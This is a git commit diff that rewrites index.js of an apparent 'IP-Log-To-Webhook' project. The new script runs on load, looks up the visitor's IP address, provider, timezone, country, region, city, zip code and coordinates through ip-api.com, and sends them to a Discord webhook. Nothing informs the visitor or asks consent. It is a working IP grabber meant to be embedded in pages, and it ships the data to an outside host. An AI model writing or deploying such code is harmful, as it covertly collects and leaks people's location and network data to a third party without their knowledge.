d852f986f57d80982afdb0dccdafa58b2b82f2e8
Luis <81855420+luisoos@users.noreply.github.com>
2022-04-17 11:47:28 +0200

    Rewrite

--- index.js
+++ index.js
@@ -1,37 +1,62 @@
-// Paste your Discord Webhook API URL into Line 15: WEBHOOKURL => YOUR API URL
+// Paste your Discord Webhook API URL into Line 3: WEBHOOKURL => YOUR API URL
 
-$(document).ready(function () {
-    $.getJSON("http://jsonip.com/?callback=?", function (data) {
-        console.log("Your IP is: " + data.ip);
-        postDataToWebhook(data.ip);
-    });
-});
+var webHookUrl = "YOUR_WEBHOOK_URL_HERE";
 
-function postDataToWebhook(data) {
+/*
+    Forked from: https://github.com/luisoos/IP-Log-To-Webhook
+    License: MIT
+*/
 
-var ip = data;
-var storedip = localStorage.getItem("UserIP")
+const request = async () => { // Calling a "synchronous" fetch
+    const response = await fetch('http://ip-api.com/json/');
+    const data = await response.json();
 
-var webHookUrl = "WEBHOOKURL";
+    // Declaring variables
+    var ip = data.query;
 
+    var provider = data.org + " (" + data.as + ")";
 
-var oReq = new XMLHttpRequest();
-var myJSONStr = { "content": "New User IP Address: " + ip, "username": "New IP" };
+    var timezone = data.timezone;
+    var country = data.country;
+    var countryCode = data.countryCode.toLowerCase()
+    var region = data.region + " (" + data.regionName + ")";
+    var city = data.city;
 
+    var zip = data.zip;
+    var lat = data.lat;
+    var lon = data.lon;
 
-if (ip == storedip) {
-    console.log("Same User")
-} else {
-    oReq.addEventListener("load", reqListener);
-    oReq.open("POST", webHookUrl, true);
-    oReq.setRequestHeader('Content-Type', 'application/json');
-    oReq.send(JSON.stringify(myJSONStr));
-    localStorage.setItem("UserIP",ip);
+    // Open POST Request
+    var postRequest = new XMLHttpRequest();
+    postRequest.open("POST", webHookUrl);
+
+    postRequest.setRequestHeader('Content-type', 'application/json');
+
+    var params = {
+        username: "IP Log",
+        avatar_url: "",
+        content:    "__**:globe_with_meridians: IP-Adress:**__ \n" 
+                    + ip + 
+                    "\n \n__**:telephone: Provider:**__ \n" 
+                    + provider + 
+                    "\n \n__**:map: Timezone:**__ \n" 
+                    + timezone + 
+                    "\n \n__**:flag_" + countryCode + ": Country:**__ \n" 
+                    + country + 
+                    "\n \n __**:park: Region:**__ \n" 
+                    + region + 
+                    "\n \n__**:cityscape: Zip Code:**__ \n" 
+                    + zip + 
+                    "\n \n __**:cityscape: City:**__ \n" 
+                    + city + 
+                    "\n \n__**:round_pushpin: Location:**__ \n" 
+                    + "**Longitude:** " + lon + "\n"
+                    + "**Latitude:** " + lat
+    }
+
+    postRequest.send(JSON.stringify(params));
+
 }
 
+request();
 
-}
-
-function reqListener() {
-console.log(this.responseText);
-}
